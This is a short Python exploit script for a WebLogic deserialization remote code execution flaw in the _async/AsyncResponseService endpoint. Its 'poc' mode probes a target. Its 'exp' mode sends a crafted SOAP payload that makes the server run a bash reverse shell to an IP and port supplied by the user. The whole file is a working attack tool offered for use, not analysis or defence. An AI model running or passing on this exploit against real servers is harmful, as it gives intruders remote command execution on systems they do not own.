#!/usr/bin/python
# -*- coding:utf-8 -*-
# wirter:En_dust
import requests
import sys

headers = {'content-type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}

def poc(target):
    if 'http' in target:
        url = target + '_async/AsyncResponseService'
        r =requests.get(url,timeout=2)
        if r.status_code ==200:
            print("[ + ] " + target + '可能存在Weblogic反序列化远程代码执行漏洞!' )
        else:
            print("[ - ] " +target + "不存在漏洞！")
def exp(target):
    ip = input("反弹到哪个IP?")
    port = input("反弹到哪个端口?")
    payload = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
    <soapenv:Header> 
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    ''' % (ip, port)
    if 'http' in target:
        url = target + '_async/AsyncResponseService'
        r = requests.post(url,headers=headers,data=payload,timeout=2)
        if r.status_code ==202:
            print("反弹成功！")


if __name__ == '__main__':
    target = sys.argv[1]
    action = sys.argv[2]
    if target != '':
        if action == '':
            exit()
        elif action == 'poc':
            poc(target)
        elif action == 'exp':
            exp(target)
